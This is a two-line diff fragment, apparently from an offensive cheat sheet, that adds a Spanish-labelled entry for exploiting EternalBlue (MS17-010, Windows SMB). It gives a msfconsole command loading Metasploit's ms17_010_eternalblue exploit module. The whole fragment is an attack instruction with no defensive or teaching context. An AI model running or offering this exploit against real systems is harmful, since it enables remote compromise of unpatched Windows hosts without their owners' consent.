@@ -1,0 +1,2 @@
+▶ Explotar EternalBlue (MS17-010 - SMB):
+  msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue"
